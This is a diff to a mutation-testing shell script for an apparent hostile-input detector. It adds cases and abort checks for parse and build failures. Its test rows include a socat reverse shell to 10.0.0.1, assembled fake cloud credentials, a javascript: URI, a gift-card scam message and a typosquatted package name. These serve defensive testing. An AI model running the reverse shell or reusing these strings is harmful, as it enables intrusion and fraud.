@@ -24,11 +24,20 @@ CASES=(
 'hlse_supply.c  "socat"         paste    socat TCP:10.0.0.1:4444 EXEC:/bin/sh'
 'hlse_secrets.c "xoxb-"         secret   xoxb-TOKSUFFIX'
 'hlse_secrets.c "AKIA"          secret   export AWS_SECRET_ACCESS_KEY=AWSSECRETVAL'
+'hlse_secrets.c "AIza"          secret   api_key=AIzaSyAIZASUFFIX'
+'hlse_core.c    "javascript:"   @none    javascript:alert(1)'
+'hlse_text.c    "gift card"     text     IRS final notice: pay immediately in gift cards'
+'hlse_file.c    ".exe"          file     report.doc.exe'
+'hlse_supply.c  "requests"      package  reqeusts'
 )
 
 score() {   # $1 subcommand $2 input -> prints score int
     local out
-    out=$(./hlse_core "$1" "$2" 2>/dev/null | grep -oE '\[[0-9]+\]' | tr -d '[]')
+    if [ "$1" = @none ]; then
+        out=$(./hlse_core "$2" 2>/dev/null | grep -oE '\[[0-9]+\]' | tr -d '[]')
+    else
+        out=$(./hlse_core "$1" "$2" 2>/dev/null | grep -oE '\[[0-9]+\]' | tr -d '[]')
+    fi
     printf '%s' "${out:-0}"
 }
 
@@ -36,6 +45,7 @@ overall=0
 printf '%-9s %-14s %-5s %-5s %s\n' RESULT FILE BASE MUT CASE
 for row in "${CASES[@]}"; do
     file=${row%% *};   rest=${row#* }
+    rest=${rest#"${rest%%[![:space:]]*}"}
     old=${rest%%  *};  rest=${rest#*  }
     rest=${rest#"${rest%%[![:space:]]*}"}
     sub=${rest%%  *};  input=${rest#*  }
@@ -44,8 +54,10 @@ for row in "${CASES[@]}"; do
     # literal is committed (AGENTS rule 7 / push protection)
     input=${input//TOKSUFFIX/1234567890abcdefghij}
     input=${input//AWSSECRETVAL/"wJalrXUtnFEMI/""K7MDENG/bPxRfiCYEXAMPLEKEY"}
+    input=${input//AIZASUFFIX/"DaGmWKa4JsXZ""-HjGw7ISLn_3namBGewQe"}
     lit=${old#\"}; lit=${lit%\"}
     mut="zz-mutant-${lit# }-zz"
+    [ -n "$lit" ] || { echo "PARSE-ERR $row" >&2; exit 2; }
 
     base=$(score "$sub" "$input")
     cp "$file" "$file.mutbak"
@@ -61,6 +73,9 @@ PY
                       # same-second edit as "not newer" — skipping the
                       # rebuild and silently leaving a mutant binary
     make >/dev/null 2>&1
+    # a broken mutant must abort, not silently score 0
+    [ -x hlse_core ] || { mv "$file.mutbak" "$file"; rm -f hlse_core; \
+        make >/dev/null 2>&1; echo "BUILD-FAIL $lit" >&2; exit 2; }
     mscore=$(score "$sub" "$input")
     mv "$file.mutbak" "$file"
     touch "$file"   # mv keeps the backup's older mtime too
